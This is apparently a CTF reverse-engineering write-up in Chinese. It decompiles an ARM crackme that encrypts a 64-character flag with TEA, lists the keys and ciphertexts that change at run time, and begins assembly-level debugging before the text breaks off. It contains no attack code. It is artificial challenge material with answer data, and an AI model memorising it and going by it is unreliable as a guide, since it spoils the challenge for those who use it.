<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> processEntry <span class="title function_">entry</span><span class="params">(undefined4 param_1,undefined4 param_2)</span></span><br><span class="line">&#123;</span><br><span class="line">  FUN_00011298(FUN_000110a4,param_2,&amp;stack0x00000004,<span class="number">0</span>,<span class="number">0</span>,param_1);</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">  FUN_00010170();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个结构很像week4的ezrust，其中的函数<code>FUN_000110a4</code>大概就是主要的函数了，双击查看：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">undefined4 <span class="title function_">FUN_000110a4</span><span class="params">(undefined4 param_1,undefined4 param_2,undefined4 param_3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  undefined4 uVar2;</span><br><span class="line">  undefined auStack_70 [<span class="number">100</span>];</span><br><span class="line">  <span class="type">int</span> local_c;</span><br><span class="line">  </span><br><span class="line">  local_c = <span class="number">0</span>;</span><br><span class="line">  FUN_0001eae0(<span class="string">&quot;please input your flag:&quot;</span>,param_2,param_3,<span class="number">0</span>); <span class="comment">//这里能看出来其实就是print</span></span><br><span class="line">  FUN_00018300(&amp;DAT_0007c814,auStack_70); <span class="comment">//这个其实就是读取输入，并存入auStack_70</span></span><br><span class="line">  iVar1 = FUN_0002ee70(auStack_70); <span class="comment">//计算长度并检查，要求长度为0x40（64个字符）</span></span><br><span class="line">  <span class="keyword">if</span> (iVar1 != <span class="number">0x40</span>) &#123;</span><br><span class="line">    FUN_0001eae0(<span class="string">&quot;you are wrong!&quot;</span>);</span><br><span class="line">    FUN_000177ac(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  FUN_00010fbc(auStack_70,&amp;DAT_000a62b8); <span class="comment">//这个是加密，key为DAT_000a62b8</span></span><br><span class="line">  iVar1 = FUN_00011020(auStack_70,&amp;DAT_000a6268); <span class="comment">//这个是比较加密的输入和DAT_000a6268</span></span><br><span class="line">  <span class="keyword">if</span> (iVar1 == <span class="number">0</span>) &#123;</span><br><span class="line">    uVar2 = FUN_0001eae0(<span class="string">&quot;you are wrong!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    uVar2 = FUN_0001eae0(<span class="string">&quot;you are right!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (local_c != <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: Subroutine does not return */</span></span><br><span class="line">    FUN_0003511c(uVar2,local_c,<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着查看外层加密函数<code>FUN\_00010fbc</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">FUN_00010fbc</span><span class="params">(<span class="type">int</span> param_1,undefined4 param_2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> iVar1;</span><br><span class="line">  <span class="type">int</span> local_c;</span><br><span class="line">  </span><br><span class="line">  iVar1 = param_1; <span class="comment">//iVar1变为输入值</span></span><br><span class="line">  <span class="keyword">for</span> (local_c = <span class="number">0</span>; local_c &lt; <span class="number">0x10</span>; local_c = local_c + <span class="number">2</span>) &#123; <span class="comment">//一次传8个字符（？）和key进行加密</span></span><br><span class="line">    iVar1 = FUN_00010e78(param_1 + local_c * <span class="number">4</span>,param_2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> iVar1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>查看内层加密函数<code>FUN\_00010e78</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> * <span class="title function_">FUN_00010e78</span><span class="params">(<span class="type">int</span> *param_1,<span class="type">int</span> *param_2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> local_18;</span><br><span class="line">  <span class="type">int</span> local_14;</span><br><span class="line">  <span class="type">int</span> local_10;</span><br><span class="line">  <span class="type">int</span> local_c;</span><br><span class="line">  local_18 = *param_1;</span><br><span class="line">  local_14 = param_1[<span class="number">1</span>];</span><br><span class="line">  local_10 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> (local_c = <span class="number">0</span>; local_c &lt; DAT_000a6264; local_c = local_c + <span class="number">1</span>) &#123;</span><br><span class="line">    local_10 = local_10 + DAT_000a6260;</span><br><span class="line">    local_18 = local_18 + ((local_14 &gt;&gt; <span class="number">5</span>) + param_2[<span class="number">1</span>] ^ local_14 * <span class="number">0x10</span> + *param_2 ^ local_14 + local_10);</span><br><span class="line">    local_14 = local_14 + ((local_18 &gt;&gt; <span class="number">5</span>) + param_2[<span class="number">3</span>] ^ local_18 * <span class="number">0x10</span> + param_2[<span class="number">2</span>] ^ local_18 + local_10) ;</span><br><span class="line">  &#125;</span><br><span class="line">  *param_1 = local_18;</span><br><span class="line">  param_1[<span class="number">1</span>] = local_14;</span><br><span class="line">  <span class="keyword">return</span> param_1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一看就是典型的<code>TEA加密</code>，再查看其中的关键数值：<br><br><br><code>local_10</code>为<code>sum</code>，起始值为0，每次加上<code>DAT_000a6260</code>（<code>0x9E3779B9</code>，经典的魔数）；<br><br><br><code>DAT_000a6264</code>是循环次数，值为<code>0x20</code>（32次），也是经典的值；<br><br><br><code>local_18</code>是第一部分的小端序，<code>local_14</code>是第二部分的小端序；<br><br><br><code>param_2</code>就是<font color=red><strong>key</strong></font>（<code>DAT_000a62b8</code>），加密的flag（<code>DAT_000a6268</code>起始）和它一样，值都是变动的，而且在调用的时候还是以指针方式进行调用，分别在<font color=lime><strong>初始化、1055c、10630、10704、107d8、108ac、10980、10a54、10b28、10bfc、10cd0、10da4</strong></font>中赋值，共计<font color=red><strong>12</strong></font>次，记录其数值为：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>	[<span class="number">0x12345678</span>, <span class="number">0x00456789</span>, <span class="number">0x00ABC123</span>, <span class="number">0x33445511</span>]</span><br><span class="line"><span class="number">2.</span>	[<span class="number">0x15AF0F5E</span>, <span class="number">0x304CBD80</span>, <span class="number">0x85BB6467</span>, <span class="number">0xA8EADC50</span>]</span><br><span class="line"><span class="number">3.</span>	[<span class="number">0x4189DF5A</span>, <span class="number">0xDB79807B</span>, <span class="number">0x44514B6C</span>, <span class="number">0xD7D1EE9A</span>]</span><br><span class="line"><span class="number">4.</span>	[<span class="number">0x73D7114C</span>, <span class="number">0xAF56E53E</span>, <span class="number">0xE93B5FC6</span>, <span class="number">0xDFE410B0</span>]</span><br><span class="line"><span class="number">5.</span>	[<span class="number">0x11223344</span>, <span class="number">0x55667788</span>, <span class="number">0x9900AABB</span>, <span class="number">0xCCDDEEFF</span>]</span><br><span class="line"><span class="number">6.</span>	[<span class="number">0x33E7A717</span>, <span class="number">0x727DCFAA</span>, <span class="number">0xAFF8D0A5</span>, <span class="number">0x0AC0C4E2</span>]</span><br><span class="line"><span class="number">7.</span>	[<span class="number">0x43302CAD</span>, <span class="number">0xE55594DF</span>, <span class="number">0x60C3FD98</span>, <span class="number">0x22A6F28F</span>]</span><br><span class="line"><span class="number">8.</span>	[<span class="number">0xC5DF4734</span>, <span class="number">0xB431300C</span>, <span class="number">0x391E3388</span>, <span class="number">0x9013F023</span>]</span><br><span class="line"><span class="number">9.</span>	[<span class="number">0xDF50EA34</span>, <span class="number">0xD43A58BF</span>, <span class="number">0xBE056EEA</span>, <span class="number">0x0C0EEB7B</span>]</span><br><span class="line"><span class="number">10.</span>	[<span class="number">0xEFF8C666</span>, <span class="number">0xA780ACB1</span>, <span class="number">0x1E3EADF0</span>, <span class="number">0x760ECBEB</span>]</span><br><span class="line"><span class="number">11.</span>	[<span class="number">0x21BC1F9B</span>, <span class="number">0x2D00D9C7</span>, <span class="number">0xB4EBAC87</span>, <span class="number">0xEA04B57E</span>]</span><br><span class="line"><span class="number">12.</span>	[<span class="number">0x33E1957F</span>, <span class="number">0x99731103</span>, <span class="number">0x5510F8B6</span>, <span class="number">0x195CEDE0</span>]</span><br></pre></td></tr></table></figure>
<p>加密部分至此已经解构完成，接下来看被加密的flag，发现其数值也是动态的，赋值函数同上，并且也是以指针方式调用，记录其数值为：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>	[ <span class="number">0xEC890F55</span>, <span class="number">0x0EE050C4</span>, <span class="number">0x9EEA10AB</span>, <span class="number">0xD5520BA3</span>, <span class="number">0xC26E2934</span>, <span class="number">0x46733FF2</span>, <span class="number">0x7FCE42D7</span> , <span class="number">0x2A66A5DC</span> , <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span> ]</span><br><span class="line"><span class="number">2.</span>	[<span class="number">0xA9219E52</span>, <span class="number">0x8899FC89</span>, <span class="number">0x34AB9A97</span>, <span class="number">0x5864F43E</span>, <span class="number">0xE251CDA8</span>, <span class="number">0x80E0A897</span>, <span class="number">0x5225F4E6</span>, <span class="number">0xDE13A861</span>, <span class="number">0x6FB7400C</span>, <span class="number">0xB1EEA2BF</span>, <span class="number">0x881ED513</span>, <span class="number">0x203E4821</span>, <span class="number">0xF311DD50</span>, <span class="number">0x0A414556</span>, <span class="number">0x99258929</span>, <span class="number">0xF7D7BDDD</span>]</span><br><span class="line"><span class="number">3.</span>	[<span class="number">0xFB7688E3</span>, <span class="number">0xD263D29F</span>, <span class="number">0xFF045328</span>, <span class="number">0x66E95242</span>, <span class="number">0x8281AFAC</span>, <span class="number">0xF988C83B</span>, <span class="number">0xBD2BF78D</span>, <span class="number">0x23ACDA89</span>, <span class="number">0x092DC50C</span>, <span class="number">0xECD6C79A</span>, <span class="number">0xB497965C</span>, <span class="number">0x2876CC31</span>, <span class="number">0x13E7111B</span>,<span class="number">0xBC50E50A</span>,<span class="number">0x9AD35B3C</span>,<span class="number">0x50886E4C</span>]</span><br><span class="line"><span class="number">4.</span>	[<span class="number">0x7E59F915</span>, <span class="number">0xDD9481AF</span>, <span class="number">0x23F9E99B</span>, <span class="number">0xBC088997</span>, <span class="number">0x2C3AB002</span>, <span class="number">0x0FE9EED2</span>, <span class="number">0xEAA0CF6B</span>, <span class="number">0xC4FF40BF</span>, <span class="number">0x3B52C537</span>, <span class="number">0x0483D92F</span>, <span class="number">0xAF4453B5</span>, <span class="number">0x831ADCE7</span>, <span class="number">0x7FBD8EBD</span>, <span class="number">0xAFEEC6E5</span>, <span class="number">0x74DFC6F</span>,<span class="number">0x2BB2A51A</span>]</span><br><span class="line"><span class="number">5.</span>	[<span class="number">0xA0F8CB44</span>, <span class="number">0xF82F83CF</span>, <span class="number">0xA55E48C2</span>, <span class="number">0x7A26E00A</span>, <span class="number">0xF1E354C9</span>, <span class="number">0x687D9915</span>, <span class="number">0xF88816E8</span>, <span class="number">0x90878E86</span>, <span class="number">0x3AB06298</span>, <span class="number">0xCBCFE78B</span>, <span class="number">0x578F0F50</span>, <span class="number">0xC39E3C65</span>, <span class="number">0xBBE92B84</span>, <span class="number">0x128A2CA2</span>, <span class="number">0xDB8F03F5</span>, <span class="number">0x8482F8E2</span>]</span><br><span class="line"><span class="number">6.</span>	[<span class="number">0xE1DF82F1</span>, <span class="number">0x9FBE49F8</span>, <span class="number">0x33848A8C</span>, <span class="number">0xC24534C6</span>, <span class="number">0x714B9BE1</span>, <span class="number">0x3887D7EC</span>, <span class="number">0xD0E515B8</span>, <span class="number">0xA71A77F1</span>, <span class="number">0x16698135</span>, <span class="number">0x87427637</span>, <span class="number">0x0A10229C</span>, <span class="number">0x208CE328</span>, <span class="number">0xBD8120E1</span>, <span class="number">0x85DCF5A7</span>, <span class="number">0x77C98355</span>, <span class="number">0x2158C62E</span>]</span><br><span class="line"><span class="number">7.</span>	[<span class="number">0xC2647352</span>, <span class="number">0x496946C8</span>, <span class="number">0x0A5944E8</span>, <span class="number">0x9C4AAF48</span>, <span class="number">0xA82C096F</span>, <span class="number">0x7DC65D6E</span>, <span class="number">0x76302746</span>, <span class="number">0x58C93877</span>, <span class="number">0x63EC49D7</span>, <span class="number">0x7A8D22D2</span>, <span class="number">0x395DF541</span>, <span class="number">0xACC5E26F</span>, <span class="number">0xE550E750</span>, <span class="number">0x03D222A6</span>, <span class="number">0x81B28445</span>,<span class="number">0xBD481CBD</span>]</span><br><span class="line"><span class="number">8.</span>	[<span class="number">0x968F995D</span>, <span class="number">0xFD51A6F3</span>, <span class="number">0x9C8D3D3D</span>, <span class="number">0x4E648DEE</span>, <span class="number">0x4210AC8A</span>, <span class="number">0x6888693A</span>, <span class="number">0x0727A3C2</span>, <span class="number">0xA3A0F4E0</span>, <span class="number">0x6C40C444</span>, <span class="number">0x04FD09A6</span>, <span class="number">0x15852F1D</span>, <span class="number">0xC81D2347</span>, <span class="number">0x645759F2</span>, <span class="number">0x47BD845E</span>, <span class="number">0xAA7F189B</span>,<span class="number">0x1E9E7514</span>]</span><br><span class="line"><span class="number">9.</span>	[<span class="number">0x5A942CDE</span>, <span class="number">0x733713ED</span>, <span class="number">0x21452579</span>, <span class="number">0x81F1BA19</span>, <span class="number">0xC1CAA74D</span>, <span class="number">0x4EFE5C69</span>, <span class="number">0xDE2E5CC1</span>, <span class="number">0x1A9A0998</span>, <span class="number">0xD6B90725</span>, <span class="number">0xB4C82B65</span>, <span class="number">0x2D21005E</span>, <span class="number">0x3668BAC9</span>,<span class="number">0x9288F630</span>,<span class="number">0xD17AFBC3</span>,<span class="number">0xFEB8AD7B</span>,<span class="number">0x649D393F</span>]</span><br><span class="line"><span class="number">10.</span>	[<span class="number">0x4A081A9E</span>, <span class="number">0xF209FB9F</span>, <span class="number">0x54569646</span>, <span class="number">0xD10E6161</span>, <span class="number">0xF9D67270</span>, <span class="number">0xFAA42C9A</span>, <span class="number">0xD0BCDC12</span>, <span class="number">0xC29F416C</span>, <span class="number">0x6570E216</span>, <span class="number">0x0E254521</span>, <span class="number">0x3098E3D3</span>, <span class="number">0xC1275C52</span>, <span class="number">0xFBECA89C</span>, <span class="number">0xD1B388C6</span>, <span class="number">0xA4115392</span>, <span class="number">0xEF7C55B0</span>]</span><br><span class="line"><span class="number">11.</span>	[<span class="number">0xB6345420</span>, <span class="number">0xD16A466C</span>, <span class="number">0x14AC4984</span>, <span class="number">0xBE313CF5</span>, <span class="number">0x9B99985F</span>, <span class="number">0x6A2B7C85</span>, <span class="number">0xE32F175D</span>, <span class="number">0x9321938F</span>, <span class="number">0x4C23F594</span>, <span class="number">0x9E981689</span>, <span class="number">0xDA25F02F</span>, <span class="number">0x5B8A8B77</span>, <span class="number">0xEE96742E</span>, <span class="number">0x03ED7A1D</span>, <span class="number">0xCA0DA40B</span>, <span class="number">0xD9310A33</span>]</span><br><span class="line"><span class="number">12.</span>	[<span class="number">0x3308AE94</span>, <span class="number">0x21C87F2A</span>, <span class="number">0x5DAA7591</span>, <span class="number">0x53B0C5F4</span>, <span class="number">0x49277BA5</span>, <span class="number">0xEC77DA5F</span>, <span class="number">0xD89202CA</span>, <span class="number">0xF0E19ACA</span>, <span class="number">0x617456C4</span>, <span class="number">0x2A19BDE3</span>, <span class="number">0xE51EBCBF</span>, <span class="number">0xC4C5FB16</span>,<span class="number">0x615AFDC2</span>,<span class="number">0x3FCD2FAE</span>,<span class="number">0x8F826EDD</span>,<span class="number">0x8B63CD45</span>]</span><br></pre></td></tr></table></figure>
<p>但是其中没有任何一组的密文与密钥能对上解密出可读的flag，考虑动态调试，使用<code>qemu+gdbserver+ida9.0</code>进行调试，发现第一组进行加密时起始密钥和密文都是第五组的值，但在32轮加密的过程中用于TEA的上半组和下半组的值的十六进制前四位却会发生多次额外的变化，并且没有明显规律，只与输入的值有关，考虑有一些其他的函数对此进行了干扰，以<code>0x34333231</code>和<code>0x38373635</code>为初始数据，第三轮进行汇编级单步调试：</p>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E78</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E78 <span class="comment">; =============== S U B R O U T I N E =======================================</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E78</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E78 <span class="comment">; Attributes: bp-based frame</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E78</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E78 sub_10E78                               <span class="comment">; CODE XREF: sub_10FBC+38↓p</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E78</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E78 var_1C          = -<span class="number">0x1C</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E78 var_18          = -<span class="number">0x18</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E78 var_14          = -<span class="number">0x14</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E78 var_10          = -<span class="number">0x10</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E78 var_C           = -<span class="number">0xC</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E78 var_8           = -<span class="number">8</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E78</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E78                 <span class="keyword">PUSH</span>    &#123;<span class="built_in">R11</span>&#125;</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E7C                 <span class="keyword">ADD</span>     <span class="built_in">R11</span>, <span class="built_in">SP</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E80                 <span class="keyword">SUB</span>     <span class="built_in">SP</span>, <span class="built_in">SP</span>, <span class="number">#0x1C</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E84                 <span class="keyword">STR</span>     <span class="built_in">R0</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_18</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E88                 <span class="keyword">STR</span>     <span class="built_in">R1</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_1C</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E8C                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_18</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E90                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R3</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E94                 <span class="keyword">STR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_14</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E98                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_18</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>E9C                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R3</span>,<span class="number">#4</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EA0                 <span class="keyword">STR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_10</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EA4                 <span class="keyword">MOV</span>     <span class="built_in">R3</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EA8                 <span class="keyword">STR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_C</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EAC                 <span class="keyword">MOV</span>     <span class="built_in">R3</span>, <span class="number">#0</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EB0                 <span class="keyword">STR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_8</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EB4                 <span class="keyword">B</span>       loc_10F74</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EB8 <span class="comment">; ---------------------------------------------------------------------------</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EB8</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EB8 loc_10EB8                               <span class="comment">; CODE XREF: sub_10E78+10C↓j</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EB8                 <span class="keyword">LDR</span>     <span class="built_in">R2</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_C</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EBC                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, <span class="symbol">=dword_A6260</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EC0                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R3</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EC4                 <span class="keyword">ADD</span>     <span class="built_in">R3</span>, <span class="built_in">R2</span>, <span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EC8                 <span class="keyword">STR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_C</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>ECC                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_10</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>ED0                 <span class="keyword">MOV</span>     <span class="built_in">R2</span>, <span class="built_in">R3</span>,LSL<span class="number">#4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>ED4                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_1C</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>ED8                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R3</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EDC                 <span class="keyword">ADD</span>     <span class="built_in">R2</span>, <span class="built_in">R2</span>, <span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EE0                 <span class="keyword">LDR</span>     <span class="built_in">R1</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_10</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EE4                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_C</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EE8                 <span class="keyword">ADD</span>     <span class="built_in">R3</span>, <span class="built_in">R1</span>, <span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EEC                 <span class="keyword">EOR</span>     <span class="built_in">R2</span>, <span class="built_in">R2</span>, <span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EF0                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_10</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EF4                 <span class="keyword">MOV</span>     <span class="built_in">R1</span>, <span class="built_in">R3</span>,ASR<span class="number">#5</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EF8                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_1C</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>EFC                 <span class="keyword">ADD</span>     <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="number">#4</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F00                 <span class="keyword">LDR</span>     <span class="built_in">R3</span>, [<span class="built_in">R3</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F04                 <span class="keyword">ADD</span>     <span class="built_in">R3</span>, <span class="built_in">R1</span>, <span class="built_in">R3</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F08                 <span class="keyword">EOR</span>     <span class="built_in">R3</span>, <span class="built_in">R3</span>, <span class="built_in">R2</span></span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F0C                 <span class="keyword">LDR</span>     <span class="built_in">R2</span>, [<span class="built_in">R11</span>,<span class="symbol">#var_14</span>]</span><br><span class="line"><span class="symbol">.text:</span><span class="number">00010</span>F10                 <span class="keyword">ADD</span>     <span class="built_in">R3</span>, <span class="built_in">R2</span>, <span class="built_in">R3</span>	<span class="comment">; 观察发现这一步左侧的是第二轮得到的正常值，右侧是有偏差的第三轮加数</span></span><br><span class="line"><span class="symbol">.text:</span><span 